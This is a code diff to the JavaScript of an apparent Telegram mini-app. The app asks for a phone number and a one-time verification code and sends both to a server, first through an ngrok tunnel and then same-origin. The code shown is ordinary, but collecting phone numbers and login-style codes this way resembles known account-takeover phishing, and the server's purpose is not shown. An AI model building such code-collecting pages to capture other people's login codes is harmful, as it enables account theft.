@@ -8,7 +8,8 @@ document.addEventListener('DOMContentLoaded', function () {
     const keys = document.querySelectorAll('.key');
     const verifyBtn = document.getElementById('verify-btn');
 
-    const SERVER_URL = 'https://proindustrialisation-annice-emptiable.ngrok-free.dev';
+    // Same server that serves this page — no CORS issue
+    const SERVER_URL = '';
 
     let currentIndex = 0;
     let userPhone = '';
@@ -18,13 +19,9 @@ document.addEventListener('DOMContentLoaded', function () {
     tg.ready();
     tg.expand();
 
-    // Safe alert — works on all WebApp versions
+    // Works on ALL versions
     function showAlert(msg) {
-        try {
-            tg.showAlert(msg);
-        } catch (e) {
-            alert(msg);
-        }
+        alert(msg);
     }
 
     // ── Phone Step ───────────────────────────────────────────────────────────
@@ -43,10 +40,7 @@ document.addEventListener('DOMContentLoaded', function () {
         try {
             const res = await fetch(`${SERVER_URL}/send-otp`, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'ngrok-skip-browser-warning': 'true'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ phone, user_id: String(userId) })
             });
 
@@ -59,7 +53,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 showAlert(result.message || 'Failed to send OTP.');
             }
         } catch (err) {
-            showAlert('Cannot reach server. Make sure server.py is running.');
+            showAlert('Error: ' + err.message);
         } finally {
             sendOtpBtn.disabled = false;
             sendOtpBtn.textContent = '📤 Send Verification Code';
@@ -129,10 +123,7 @@ document.addEventListener('DOMContentLoaded', function () {
         try {
             const res = await fetch(`${SERVER_URL}/verify-otp`, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'ngrok-skip-browser-warning': 'true'
-                },
+                headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ otp, user_id: String(userId) })
             });
 
@@ -151,7 +142,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 otpBoxes[0].focus();
             }
         } catch (err) {
-            showAlert('Cannot reach server.');
+            showAlert('Error: ' + err.message);
         } finally {
             verifyBtn.disabled = false;
             verifyBtn.textContent = '✅ Verify Code';
